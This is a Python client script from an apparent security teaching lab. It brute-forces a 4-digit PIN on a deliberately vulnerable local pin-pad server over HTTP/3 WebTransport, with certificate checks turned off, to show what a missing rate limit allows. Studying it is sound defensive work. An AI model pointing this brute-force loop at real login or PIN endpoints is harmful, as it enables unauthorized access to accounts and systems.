"""Client for the vault pin-pad. Brute-forces the 4-digit PIN by trying 0000..9999.

Because the server has no rate limit, this walks through every combination as fast as the
network allows and cracks the PIN in seconds.

    # direct
    .venv\\Scripts\\python.exe vuln_apps\\05_no_rate_limit\\client.py

    # through Legilimens (:4433): watch thousands of guesses flood the traffic log
    #   (first: POST http://localhost:4436/target {"host":"127.0.0.1","port":4455})
    .venv\\Scripts\\python.exe vuln_apps\\05_no_rate_limit\\client.py --port 4433
"""

import argparse
import asyncio
import json
import ssl
import sys
import time

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

from aioquic.asyncio import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3Connection, H3_ALPN
from aioquic.h3.events import DatagramReceived, HeadersReceived
from aioquic.quic.configuration import QuicConfiguration


class PinPadClient(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._http: H3Connection | None = None
        self._session_id: int | None = None
        self._request_stream_id: int | None = None
        self.ready = asyncio.Event()
        self.reply = asyncio.Event()
        self.last = None

    def quic_event_received(self, event):
        if self._http is None:
            self._http = H3Connection(self._quic, enable_webtransport=True)
        for h3_event in self._http.handle_event(event):
            if isinstance(h3_event, HeadersReceived) and h3_event.stream_id == self._request_stream_id:
                if dict(h3_event.headers).get(b":status") == b"200":
                    self._session_id = h3_event.stream_id
                    self.ready.set()
            elif isinstance(h3_event, DatagramReceived) and h3_event.stream_id == self._session_id:
                self.last = h3_event.data.decode(errors="replace")
                self.reply.set()

    async def open(self, authority: str) -> bool:
        stream_id = self._quic.get_next_available_stream_id(is_unidirectional=False)
        self._request_stream_id = stream_id
        self._http.send_headers(
            stream_id=stream_id,
            headers=[
                (b":method", b"CONNECT"), (b":scheme", b"https"),
                (b":authority", authority.encode()), (b":path", b"/pinpad"),
                (b":protocol", b"webtransport"), (b"origin", f"https://{authority}".encode()),
            ],
        )
        self.transmit()
        try:
            await asyncio.wait_for(self.ready.wait(), timeout=10.0)
        except asyncio.TimeoutError:
            return False
        return self._session_id is not None

    async def guess(self, pin: str) -> dict | None:
        self.reply.clear()
        self._http.send_datagram(stream_id=self._session_id, data=json.dumps({"cmd": "guess", "pin": pin}).encode())
        self.transmit()
        try:
            await asyncio.wait_for(self.reply.wait(), timeout=3.0)
        except asyncio.TimeoutError:
            return None
        return json.loads(self.last)


async def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=4455, help="4455 = pin-pad direct, 4433 = via Legilimens")
    p.add_argument("--max", type=int, default=10000, help="how many PINs to try (0000..)")
    args = p.parse_args()

    authority = f"{args.host}:{args.port}"
    config = QuicConfiguration(alpn_protocols=H3_ALPN, is_client=True,
                               max_datagram_frame_size=65536, verify_mode=ssl.CERT_NONE)

    print(f"[attacker] connecting to {authority}/pinpad ...")
    async with connect(args.host, args.port, configuration=config, create_protocol=PinPadClient) as c:
        if not await c.open(authority):
            print("[attacker] CONNECT failed (is the server running / proxy in capturing mode?)")
            return

        print(f"[attacker] brute-forcing the PIN (up to {args.max} guesses, no rate limit to stop us)...")
        t0 = time.time()
        cracked = None
        for n in range(args.max):
            pin = f"{n:04d}"
            r = await c.guess(pin)
            if r is None:
                continue  # dropped datagram — skip
            if r.get("result") == "rate_limited":
                print(f"[attacker] blocked after {n} guesses — the server rate-limited us. (This is the FIX working.)")
                break
            if r.get("result") == "correct":
                cracked = pin
                break
            if n and n % 2000 == 0:
                print(f"    ...{n} guesses so far, still allowed")

        dt = time.time() - t0
        if cracked is not None:
            rate = (n + 1) / dt if dt else 0
            print(f"[attacker] CRACKED: PIN = {cracked}  in {n + 1} guesses, {dt:.1f}s  ({rate:.0f} guesses/sec)")
            print("[attacker] ^ nothing ever throttled us — that's the missing rate limit.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
